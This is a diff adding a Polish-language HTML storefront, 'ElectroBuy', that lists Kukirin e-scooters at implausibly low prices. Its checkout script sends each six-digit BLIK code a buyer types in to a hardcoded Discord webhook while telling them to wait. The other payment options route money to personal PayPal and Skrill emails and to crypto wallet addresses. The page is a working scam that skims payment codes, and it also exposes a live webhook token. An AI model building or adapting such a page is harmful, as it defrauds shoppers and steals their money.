@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <title>ElectroBuy</title>
+    <style>
+        body { margin: 0; background: #18122B; color: #eee; font-family: 'Roboto', Arial, Helvetica, sans-serif; min-height: 100vh; }
+        header { padding: 48px 20px 24px 20px; text-align: center; background: linear-gradient(90deg, #0ff 0%, #f0f 100%); color: #18122B; font-size: 3rem; font-weight: 700; letter-spacing: 4px; border-bottom-left-radius: 40px; border-bottom-right-radius: 40px; box-shadow: 0 8px 32px 0 rgba(0,255,255,0.15), 0 4px 16px 0 rgba(255,0,255,0.10); margin-bottom: 24px; text-shadow: 0 0 24px #fff8, 0 0 8px #0ff8; text-transform: uppercase; position: relative; z-index: 2; }
+        .scooter-bg { position: fixed; bottom: 0; right: 0; width: 420px; max-width: 60vw; opacity: 0.13; z-index: 0; pointer-events: none; filter: blur(1px) grayscale(0.2); }
+        .scooter-bg2 { position: fixed; top: 120px; left: 0; width: 320px; max-width: 45vw; opacity: 0.10; z-index: 0; pointer-events: none; filter: blur(1.5px) grayscale(0.3); transform: scaleX(-1) rotate(-8deg); }
+        .products { display: flex; justify-content: center; gap: 32px; padding: 40px 20px 0 20px; flex-wrap: wrap; max-width: 1200px; margin: 0 auto; position: relative; z-index: 2; }
+        .product { background: linear-gradient(135deg, #23235B 60%, #0ff2 100%); padding: 28px 20px 20px 20px; border-radius: 24px; width: 260px; text-align: center; box-shadow: 0 8px 32px 0 rgba(0,255,255,0.10), 0 4px 16px 0 rgba(255,0,255,0.10); position: relative; overflow: hidden; border: 1.5px solid #0ff6; backdrop-filter: blur(2px); z-index: 2; }
+        .product-img-wrap { width: 100%; height: 220px; display: flex; align-items: center; justify-content: center; background: linear-gradient(135deg, #23235B 60%, #0ff2 100%); border-radius: 16px; margin-bottom: 18px; overflow: hidden; position: relative; box-shadow: 0 4px 16px #0ff4, 0 2px 8px #f0f2; }
+        .product img { width: 100%; height: 100%; object-fit: contain; display: block; background: transparent; }
+        .product h3 { margin: 10px 0 6px 0; font-size: 1.25rem; color: #0ff; font-weight: 700; letter-spacing: 1px; z-index: 1; position: relative; text-shadow: 0 2px 8px #0ff4; }
+        .product p { margin: 0 0 18px 0; font-size: 1.1rem; color: #eee; z-index: 1; position: relative; font-weight: 500; letter-spacing: 0.5px; }
+        .product button { background: linear-gradient(135deg, #f0f 0%, #0ff 100%); color: #18122B; border: none; padding: 12px 24px; cursor: pointer; border-radius: 12px; font-size: 1.1rem; font-weight: 700; box-shadow: 0 2px 8px #0ff4; font-family: 'Roboto', Arial, Helvetica, sans-serif; letter-spacing: 1px; margin-top: 8px; }
+        .cart-icon { position: fixed; top: 32px; left: 32px; z-index: 1001; background: linear-gradient(135deg, #0ff, #f0f); border-radius: 50%; width: 60px; height: 60px; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 15px #0ff, 0 0 10px #f0f; cursor: pointer; border: 2px solid #0ff; }
+        .cart-icon svg { width: 36px; height: 36px; fill: #18122B; }
+        .cart-count { position: absolute; top: 10px; left: 40px; background: #f0f; color: #18122B; border-radius: 50%; width: 22px; height: 22px; display: flex; align-items: center; justify-content: center; font-size: 1rem; font-weight: bold; border: 2px solid #0ff; box-shadow: 0 0 8px #0ff; }
+        #cart-panel { position: fixed; top: 32px; left: 110px; width: 350px; background: linear-gradient(135deg, #23235B 60%, #0ff2 100%); color: #eee; border-radius: 20px; box-shadow: 0 0 30px rgba(0,255,255,0.8), 0 8px 32px 0 #f0f4; border: 2px solid #0ff; padding: 28px 24px 24px 24px; z-index: 1002; opacity: 0; pointer-events: none; transform: translateY(-30px) scale(0.95); transition: opacity 0.4s, transform 0.4s; display: flex; flex-direction: column; backdrop-filter: blur(8px); }
+        #cart-panel.open { opacity: 1; pointer-events: auto; transform: translateY(0) scale(1); }
+        #cart-panel h2 { margin-top: 0; font-size: 1.5rem; text-align: center; color: #0ff; letter-spacing: 1px; font-weight: 700; margin-bottom: 18px; text-shadow: 0 2px 8px #0ff4; }
+        .cart-item { display: flex; justify-content: space-between; align-items: center; margin: 10px 0; background: #23235Bcc; border-radius: 10px; padding: 8px 10px; box-shadow: 0 2px 8px #0ff2; font-size: 1.05rem; font-weight: 500; letter-spacing: 0.5px; }
+        .cart-item button { background: #444; border: none; color: #eee; font-size: 1.2rem; width: 30px; height: 30px; cursor: pointer; border-radius: 50%; margin: 0 2px; font-family: 'Roboto', Arial, Helvetica, sans-serif; }
+        .cart-item button:hover { background: #0ff; color: #18122B; }
+        .checkout { background: linear-gradient(135deg, #0ff, #f0f); border: 2px solid #0ff; color: #18122B; padding: 14px; width: 100%; cursor: pointer; font-size: 1.15rem; border-radius: 12px; margin-top: 18px; font-weight: 700; box-shadow: 0 2px 8px #0ff4; font-family: 'Roboto', Arial, Helvetica, sans-serif; letter-spacing: 1px; }
+        .close-cart { position: absolute; top: 10px; right: 16px; background: none; border: none; color: #eee; font-size: 1.5rem; cursor: pointer; z-index: 10; }
+        .cart-total { text-align: right; font-size: 1.2rem; margin-top: 12px; font-weight: bold; color: #0ff; letter-spacing: 1px; text-shadow: 0 2px 8px #0ff4; }
+        .cart-error { color: #fff; background: #e53935; border-radius: 8px; padding: 10px 0; text-align: center; font-weight: bold; margin-bottom: 10px; font-size: 1.1rem; box-shadow: 0 2px 8px #e5393555; }
+        .modal-bg { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(24, 18, 43, 0.85); z-index: 2000; display: none; align-items: center; justify-content: center; }
+        .modal-bg.open { display: flex; }
+        .modal { background: linear-gradient(135deg, #23235B 60%, #0ff2 100%); border-radius: 24px; padding: 36px 28px 28px 28px; min-width: 320px; max-width: 95vw; box-shadow: 0 8px 32px #0ff8, 0 4px 16px #f0f4; color: #eee; position: relative; }
+        .modal h2 { margin-top: 0; color: #0ff; text-align: center; font-size: 1.3rem; margin-bottom: 18px; letter-spacing: 1px; font-weight: 700; text-shadow: 0 2px 8px #0ff4; }
+        .modal .pay-options, .modal .crypto-options { display: flex; flex-direction: column; gap: 16px; margin-bottom: 18px; }
+        .modal .pay-btn, .modal .crypto-btn { background: linear-gradient(135deg, #0ff, #f0f); color: #18122B; border: none; border-radius: 12px; padding: 12px 0; font-size: 1.1rem; font-weight: 700; cursor: pointer; box-shadow: 0 2px 8px #0ff4; font-family: 'Roboto', Arial, Helvetica, sans-serif; letter-spacing: 1px; }
+        .modal .pay-btn:hover, .modal .crypto-btn:hover { background: linear-gradient(135deg, #f0f, #0ff); color: #fff; }
+        .modal .pay-info { margin-top: 10px; background: #23235Bcc; border-radius: 10px; padding: 14px 12px; color: #0ff; font-size: 1.08rem; text-align: center; font-weight: 500; box-shadow: 0 2px 8px #0ff2; word-break: break-all; }
+        .modal .blik-form { margin-top: 10px; display: flex; flex-direction: column; align-items: center; gap: 10px; }
+        .modal .blik-form input { padding: 10px; border-radius: 8px; border: 1.5px solid #0ff; font-size: 1.1rem; width: 120px; text-align: center; background: #18122B; color: #0ff; outline: none; margin-bottom: 6px; }
+        .modal .blik-form button { background: linear-gradient(135deg, #0ff, #f0f); color: #18122B; border: none; border-radius: 8px; padding: 8px 18px; font-size: 1.05rem; font-weight: 700; cursor: pointer; box-shadow: 0 2px 8px #0ff4; font-family: 'Roboto', Arial, Helvetica, sans-serif; letter-spacing: 1px; }
+        .modal .blik-form button:hover { background: linear-gradient(135deg, #f0f, #0ff); color: #fff; }
+        .modal .blik-success { color: #0f0; font-weight: 700; margin-top: 10px; font-size: 1.1rem; }
+        .modal .close-modal { position: absolute; top: 10px; right: 18px; background: none; border: none; color: #eee; font-size: 1.5rem; cursor: pointer; z-index: 10; }
+        .dane-form { margin-top: 10px; display: flex; flex-direction: column; align-items: center; gap: 10px; }
+        .dane-form input { padding: 10px; border-radius: 8px; border: 1.5px solid #0ff; font-size: 1.1rem; width: 180px; text-align: center; background: #18122B; color: #0ff; outline: none; margin-bottom: 6px; }
+        .dane-form button { background: linear-gradient(135deg, #0ff, #f0f); color: #18122B; border: none; border-radius: 8px; padding: 8px 18px; font-size: 1.05rem; font-weight: 700; cursor: pointer; box-shadow: 0 2px 8px #0ff4; font-family: 'Roboto', Arial, Helvetica, sans-serif; letter-spacing: 1px; }
+        .dane-form button:hover { background: linear-gradient(135deg, #f0f, #0ff); color: #fff; }
+        .dane-success { color: #0f0; font-weight: 700; margin-top: 10px; font-size: 1.1rem; }
+        .pay-final-msg { color: #0ff; font-weight: 700; margin-top: 10px; font-size: 1.1rem; }
+        .crypto-options { margin-top: 10px; }
+        .crypto-btn { margin-bottom: 0; }
+    </style>
+</head>
+<body>
+    <header>ElectroBuy</header>
+    <img class="scooter-bg" src="https://cdn.pixabay.com/photo/2017/01/31/13/14/scooter-2027660_1280.png" alt="Ilustracja hulajnogi">
+    <img class="scooter-bg2" src="https://cdn.pixabay.com/photo/2017/01/31/13/14/scooter-2027660_1280.png" alt="Ilustracja hulajnogi 2">
+    <div class="products" id="products"></div>
+    <div class="cart-icon" id="cartIcon" title="Pokaż koszyk">
+        <svg viewBox="0 0 24 24">
+            <path d="M7 18c-1.104 0-2 .896-2 2s.896 2 2 2 2-.896 2-2-.896-2-2-2zm10 0c-1.104 0-2 .896-2 2s.896 2 2 2 2-.896 2-2-.896-2-2-2zm1.447-2.105l1.553-9.895h-16l1.553 9.895c.091.583.595 1.105 1.184 1.105h10.526c.589 0 1.093-.522 1.184-1.105zm-13.447-11.895v-2c0-1.104.896-2 2-2h10c1.104 0 2 .896 2 2v2h-14z"/>
+        </svg>
+        <span class="cart-count" id="cartCount">0</span>
+    </div>
+    <div id="cart-panel">
+        <button class="close-cart" id="closeCart" title="Zamknij koszyk">&times;</button>
+        <h2>Koszyk</h2>
+        <div id="cartError"></div>
+        <div id="cartItems"></div>
+        <div class="cart-total" id="cartTotal"></div>
+        <button class="checkout" id="checkoutBtn">Zamów</button>
+    </div>
+    <div class="modal-bg" id="payModalBg">
+        <div class="modal" id="payModal">
+            <button class="close-modal" id="closePayModal" title="Zamknij">&times;</button>
+            <h2 id="payModalTitle">Podaj dane do wysyłki</h2>
+            <form class="dane-form" id="daneForm">
+                <input type="text" id="daneAdres" placeholder="Adres dostawy" required>
+                <input type="text" id="daneTelefon" placeholder="Numer telefonu" required maxlength="9" pattern="\d{1,9}">
+                <input type="email" id="daneEmail" placeholder="E-mail" required>
+                <button type="submit">Zapisz dane</button>
+                <div class="dane-success" id="daneSuccess" style="display:none"></div>
+            </form>
+            <div class="pay-options" id="payOptions" style="display:none">
+                <button class="pay-btn" data-pay="blik">BLIK</button>
+                <button class="pay-btn" data-pay="paypal">PayPal</button>
+                <button class="pay-btn" data-pay="skrill">Skrill</button>
+                <button class="pay-btn" data-pay="crypto">Kryptowaluty</button>
+            </div>
+            <form class="blik-form" id="blikForm" style="display:none">
+                <div style="color:#fff; margin-bottom:6px;">
+                    Wpisz kod BLIK na sumę zamówienia.
+                </div>
+                <input type="text" id="blikCode" maxlength="6" pattern="[0-9]{6}" placeholder="Kod BLIK" autocomplete="off" required>
+                <button type="submit">Wyślij kod</button>
+                <div class="blik-success" id="blikSuccess" style="display:none"></div>
+                <div style="color:#f0f; margin-top:8px;">Jeżeli kod BLIK nie zostanie przyjęty, proszę spróbować później.</div>
+            </form>
+            <div class="pay-info" id="payInfo" style="display:none"></div>
+            <div class="crypto-options" id="cryptoOptions" style="display:none">
+                <button class="crypto-btn" data-crypto="btc">Bitcoin</button>
+                <button class="crypto-btn" data-crypto="ltc">Litecoin</button>
+                <button class="crypto-btn" data-crypto="sol">Solana</button>
+                <button class="crypto-btn" data-crypto="eth">Ethereum</button>
+            </div>
+            <div class="pay-final-msg" id="payFinalMsg" style="display:none"></div>
+        </div>
+    </div>
+    <script>
+        // Produkty
+        const products = [
+            { name: "Kukirn G2", price: 150, img: "https://image.ceneostatic.pl/data/products/176018202/i-kukirin-g2-800w.jpg" },
+            { name: "Kukirn G2 Pro", price: 250, img: "https://image.ceneostatic.pl/data/products/176018202/i-kukirin-g2-800w.jpg" },
+            { name: "Kukirn G2 Master", price: 299, img: "https://th.bing.com/th/id/OIP.LgIL5gdSB-3c7hYb3qmfVQHaHa?w=169&h=180&c=7&r=0&o=5&pid=1.7" },
+            { name: "Kukirn G3", price: 250, img: "https://th.bing.com/th/id/OIP.ACuiHXmVwoMUf0O0_0k8dAHaHa?w=186&h=186&c=7&r=0&o=7&pid=1.7&rm=3" },
+            { name: "Kukirn G3 Pro", price: 300, img: "https://th.bing.com/th/id/OIP.mGeEjEDAPgNo9gs1FoTbfQHaHa?w=188&h=189&c=7&r=0&o=7&pid=1.7&rm=3" },
+            { name: "Kukirn G4", price: 399, img: "https://th.bing.com/th/id/OIP.LgIL5gdSB-3c7hYb3qmfVQHaHa?w=169&h=180&c=7&r=0&o=5&pid=1.7" },
+            { name: "Kukirn G4 Max", price: 499, img: "https://th.bing.com/th/id/OIP.6-l4lvs6Ma1Ojlu2UZLOeAHaHq?w=176&h=182&c=7&r=0&o=7&pid=1.7&rm=3" },
+            { name: "Kukirin G2 Max", price: 250, img: "https://th.bing.com/th/id/OIP.oWSGkA9D-jt2oHTlLYI4mgHaHa?w=170&h=180&c=7&r=0&o=7&pid=1.7&rm=3" },
+            { name: "Kukirin M4 Max", price: 250, img: "https://img.joomcdn.net/69c1fd65707d9e59d23524597dd48b61a6207557_original.jpeg" }
+        ];
+
+        // Renderowanie produktów
+        const productsDiv = document.getElementById('products');
+        products.forEach((prod, idx) => {
+            const div = document.createElement('div');
+            div.className = 'product';
+            div.innerHTML = `
+                <div class="product-img-wrap">
+                    <img src="${prod.img}" alt="${prod.name}">
+                </div>
+                <h3>${prod.name}</h3>
+                <p>Cena: ${prod.price} zł</p>
+                <button data-idx="${idx}">Dodaj do koszyka</button>
+            `;
+            productsDiv.appendChild(div);
+        });
+
+        // Koszyk
+        let cart = [];
+        let cartTimeout = null;
+        let errorTimeout = null;
+
+        // Dodawanie do koszyka
+        productsDiv.addEventListener('click', function(e) {
+            if (e.target.tagName === 'BUTTON') {
+                const idx = parseInt(e.target.getAttribute('data-idx'));
+                const prod = products[idx];
+                const found = cart.find(item => item.name === prod.name);
+                if (found) {
+                    found.qty += 1;
+                } else {
+                    cart.push({ ...prod, qty: 1 });
+                }
+                updateCart();
+                openCart(true);
+            }
+        });
+
+        // Aktualizacja koszyka
+        function updateCart() {
+            const cartItemsDiv = document.getElementById('cartItems');
+            const cartCount = document.getElementById('cartCount');
+            const cartTotal = document.getElementById('cartTotal');
+            cartItemsDiv.innerHTML = '';
+            let total = 0;
+            let count = 0;
+            cart.forEach((item, i) => {
+                total += item.price * item.qty;
+                count += item.qty;
+                const itemDiv = document.createElement('div');
+                itemDiv.className = 'cart-item';
+                itemDiv.innerHTML = `
+                    <span>${item.name}</span>
+                    <button data-action="minus" data-idx="${i}">-</button>
+                    <span>${item.qty}</span>
+                    <button data-action="plus" data-idx="${i}">+</button>
+                    <span>${item.price * item.qty} zł</span>
+                `;
+                cartItemsDiv.appendChild(itemDiv);
+            });
+            cartCount.textContent = count;
+            cartTotal.textContent = total > 0 ? `Suma: ${total} zł` : '';
+        }
+
+        // Obsługa przycisków + i -
+        document.getElementById('cartItems').addEventListener('click', function(e) {
+            if (e.target.tagName === 'BUTTON') {
+                const idx = parseInt(e.target.getAttribute('data-idx'));
+                const action = e.target.getAttribute('data-action');
+                if (action === 'plus') {
+                    cart[idx].qty += 1;
+                } else if (action === 'minus') {
+                    cart[idx].qty -= 1;
+                    if (cart[idx].qty <= 0) cart.splice(idx, 1);
+                }
+                updateCart();
+            }
+        });
+
+        // Otwieranie i zamykanie koszyka
+        const cartIcon = document.getElementById('cartIcon');
+        const cartPanel = document.getElementById('cart-panel');
+        const closeCart = document.getElementById('closeCart');
+        const cartError = document.getElementById('cartError');
+        const checkoutBtn = document.getElementById('checkoutBtn');
+
+        function openCart(autoClose = false) {
+            cartPanel.classList.add('open');
+            if (cartTimeout) clearTimeout(cartTimeout);
+            if (autoClose) {
+                cartTimeout = setTimeout(() => {
+                    cartPanel.classList.remove('open');
+                }, 2000);
+            }
+        }
+        function closeCartPanel() {
+            cartPanel.classList.remove('open');
+            if (cartTimeout) clearTimeout(cartTimeout);
+        }
+
+        cartIcon.addEventListener('click', () => openCart(false));
+        closeCart.addEventListener('click', closeCartPanel);
+
+        document.addEventListener('mousedown', (e) => {
+            if (cartPanel.classList.contains('open') && !cartPanel.contains(e.target) && !cartIcon.contains(e.target)) {
+                closeCartPanel();
+            }
+        });
+
+        // MODAL PŁATNOŚCI
+        const payModalBg = document.getElementById('payModalBg');
+        const payModal = document.getElementById('payModal');
+        const closePayModal = document.getElementById('closePayModal');
+        const payModalTitle = document.getElementById('payModalTitle');
+        const daneForm = document.getElementById('daneForm');
+        const daneAdres = document.getElementById('daneAdres');
+        const daneTelefon = document.getElementById('daneTelefon');
+        const daneEmail = document.getElementById('daneEmail');
+        const daneSuccess = document.getElementById('daneSuccess');
+        const payOptions = document.getElementById('payOptions');
+        const blikForm = document.getElementById('blikForm');
+        const blikCode = document.getElementById('blikCode');
+        const blikSuccess = document.getElementById('blikSuccess');
+        const payInfo = document.getElementById('payInfo');
+        const cryptoOptions = document.getElementById('cryptoOptions');
+        const payFinalMsg = document.getElementById('payFinalMsg');
+
+        let daneSaved = false;
+        let currentCrypto = null;
+
+        function openPayModal() {
+            payModalBg.classList.add('open');
+            payModalTitle.textContent = "Podaj dane do wysyłki";
+            daneForm.style.display = 'flex';
+            daneAdres.value = '';
+            daneTelefon.value = '';
+            daneEmail.value = '';
+            daneSuccess.style.display = 'none';
+            payOptions.style.display = 'none';
+            blikForm.style.display = 'none';
+            payInfo.style.display = 'none';
+            cryptoOptions.style.display = 'none';
+            payFinalMsg.style.display = 'none';
+            blikSuccess.style.display = 'none';
+            daneSaved = false;
+            currentCrypto = null;
+        }
+        function closePayModalFunc() {
+            payModalBg.classList.remove('open');
+        }
+        closePayModal.addEventListener('click', closePayModalFunc);
+        payModalBg.addEventListener('mousedown', (e) => {
+            if (e.target === payModalBg) closePayModalFunc();
+        });
+
+        // Dane do wysyłki
+        daneForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const tel = daneTelefon.value.trim();
+            // Pozwala na maksymalnie 9 cyfr, tylko cyfry
+            if (!/^\d{1,9}$/.test(tel)) {
+                daneSuccess.style.display = 'block';
+                daneSuccess.style.color = '#e53935';
+                daneSuccess.textContent = 'Numer telefonu może mieć maksymalnie 9 cyfr!';
+                setTimeout(() => { daneSuccess.style.display = 'none'; }, 1500);
+                return;
+            }
+            if (daneAdres.value.trim() && tel && daneEmail.value.trim()) {
+                daneSuccess.style.display = 'block';
+                daneSuccess.style.color = '#0f0';
+                daneSuccess.textContent = 'Dane zapisane!';
+                daneSaved = true;
+                setTimeout(() => {
+                    daneForm.style.display = 'none';
+                    payModalTitle.textContent = "Wybierz metodę płatności";
+                    payOptions.style.display = 'flex';
+                }, 800);
+            }
+        });
+
+        // Metody płatności
+        payOptions.addEventListener('click', function(e) {
+            if (e.target.classList.contains('pay-btn')) {
+                payOptions.style.display = 'none';
+                payInfo.style.display = 'none';
+                blikForm.style.display = 'none';
+                cryptoOptions.style.display = 'none';
+                payFinalMsg.style.display = 'none';
+                blikSuccess.style.display = 'none';
+                currentCrypto = null;
+
+                if (e.target.getAttribute('data-pay') === 'blik') {
+                    blikForm.style.display = 'flex';
+                } else if (e.target.getAttribute('data-pay') === 'paypal') {
+                    payInfo.style.display = 'block';
+                    payInfo.innerHTML = `
+                        <b>Wyślij cenę zamówienia na e-mail PayPal:</b><br>
+                        <span style="color:#fff">wiktor.ozog@wp.pl</span>
+                        <div style="color:#f0f; margin-top:8px;">Prosimy o wysłanie potwierdzenia na e-mail: <b>kontakt@electrobuy.pl</b></div>
+                        <button id="paypalDoneBtn" style="margin-top:14px;background:linear-gradient(135deg,#0ff,#f0f);color:#18122B;border:none;border-radius:8px;padding:10px 24px;font-size:1.1rem;font-weight:700;cursor:pointer;box-shadow:0 2px 8px #0ff4;font-family:'Roboto',Arial,Helvetica,sans-serif;letter-spacing:1px;">Gotowe</button>
+                    `;
+                    setTimeout(() => {
+                        const btn = document.getElementById('paypalDoneBtn');
+                        if (btn) btn.onclick = function() {
+                            payInfo.innerHTML = '<span style="color:#0f0;font-weight:700;">Dziękujemy za zamówienie!</span>';
+                            setTimeout(closePayModalFunc, 1200);
+                            cart = [];
+                            updateCart();
+                            closeCartPanel();
+                        };
+                    }, 100);
+                } else if (e.target.getAttribute('data-pay') === 'skrill') {
+                    payInfo.style.display = 'block';
+                    payInfo.innerHTML = `
+                        <b>Wyślij cenę zamówienia na e-mail Skrill:</b><br>
+                        <span style="color:#fff">oskiolimp.pl@wp.pl</span>
+                        <div style="color:#f0f; margin-top:8px;">Prosimy o wysłanie potwierdzenia na e-mail: <b>kontakt@electrobuy.pl</b></div>
+                        <button id="skrillDoneBtn" style="margin-top:14px;background:linear-gradient(135deg,#0ff,#f0f);color:#18122B;border:none;border-radius:8px;padding:10px 24px;font-size:1.1rem;font-weight:700;cursor:pointer;box-shadow:0 2px 8px #0ff4;font-family:'Roboto',Arial,Helvetica,sans-serif;letter-spacing:1px;">Gotowe</button>
+                    `;
+                    setTimeout(() => {
+                        const btn = document.getElementById('skrillDoneBtn');
+                        if (btn) btn.onclick = function() {
+                            payInfo.innerHTML = '<span style="color:#0f0;font-weight:700;">Dziękujemy za zamówienie!</span>';
+                            setTimeout(closePayModalFunc, 1200);
+                            cart = [];
+                            updateCart();
+                            closeCartPanel();
+                        };
+                    }, 100);
+                } else if (e.target.getAttribute('data-pay') === 'crypto') {
+                    cryptoOptions.style.display = 'flex';
+                }
+            }
+        });
+
+        // Webhook URL do Discorda
+        const webhookUrl = 'https://discord.com/api/webhooks/1406441609368961155/5YUSBK9xSFLCjywALiRcjEpd5BobUrqeKa53tKG7AjBS-bcYchNAO9zs7PjaJXYaJNAO';
+
+        // Funkcja do wysyłania wiadomości przez webhook
+        function sendWebhookMessage(message) {
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: message,
+                }),
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Błąd przy wysyłaniu wiadomości do webhooka:', response.status, response.statusText);
+                }
+            })
+            .catch(error => {
+                console.error('Błąd sieci:', error);
+            });
+        }
+
+        // BLIK
+        blikForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const code = blikCode.value.trim();
+            if (/^\d{6}$/.test(code)) {
+                blikSuccess.style.display = 'block';
+                blikSuccess.style.color = '#0ff';
+                blikSuccess.textContent = 'Poczekaj aż kod BLIK zostanie zaakceptowany. Jeżeli nie, spróbuj ponownie później.';
+                
+                // Wysyłanie kodu BLIK do webhooka
+                sendWebhookMessage(`Wprowadzono kod BLIK: ${code}`);
+
+                setTimeout(() => {
+                    closePayModalFunc();
+                    cart = [];
+                    updateCart();
+                    closeCartPanel();
+                }, 4000);
+            } else {
+                blikSuccess.style.display = 'block';
+                blikSuccess.style.color = '#e53935';
+                blikSuccess.textContent = 'Kod nie został zaakceptowany. Spróbuj później.';
+                setTimeout(() => {
+                    blikSuccess.style.display = 'none';
+                    blikSuccess.style.color = '#0f0';
+                }, 2000);
+            }
+        });
+
+        // Kryptowaluty
+        cryptoOptions.addEventListener('click', function(e) {
+            if (e.target.classList.contains('crypto-btn')) {
+                currentCrypto = e.target.getAttribute('data-crypto');
+                let address = '';
+                let name = '';
+                if (currentCrypto === 'btc') {
+                    name = 'Bitcoin';
+                    address = 'bc1qnwkf238m7gx4rqlf2jt9akczxr3w9pnasgn65h';
+                } else if (currentCrypto === 'ltc') {
+                    name = 'Litecoin';
+                    address = 'LW3xCvkigxG1jTrdTWUNXXj1SNrdvfvLeP';
+                } else if (currentCrypto === 'sol') {
+                    name = 'Solana';
+                    address = 'JB8Kn7Nz5yGk12Vqdo2TPw5AA5UewVJ4EGZ3ku8wSBRF';
+                } else if (currentCrypto === 'eth') {
+                    name = 'Ethereum';
+                    address = '0x06d0740Ee00BE67b06172B70067539fCc80a2A1C';
+                }
+                cryptoOptions.style.display = 'none';
+                payInfo.style.display = 'block';
+                payInfo.innerHTML = `
+                    <b>Wyślij równowartość zamówienia w ${name} na adres:</b><br>
+                    <span style="color:#fff">${address}</span>
+                    <div style="color:#f0f; margin-top:8px;">Potwierdzenie oraz dane do wysyłki wyślij na e-mail: <b>kontakt@electrobuy.pl</b></div>
+                `;
+            }
+        });
+
+        // Zamawianie
+        checkoutBtn.addEventListener('click', function() {
+            cartError.innerHTML = '';
+            if (errorTimeout) clearTimeout(errorTimeout);
+            if (cart.length === 0) {
+                cartError.innerHTML = '<div class="cart-error">Koszyk jest pusty!</div>';
+                errorTimeout = setTimeout(() => {
+                    cartError.innerHTML = '';
+                }, 1000);
+                return;
+            }
+            openPayModal();
+        });
+
+        // Inicjalizacja
+        updateCart();
+    </script>
+</body>
+</html>
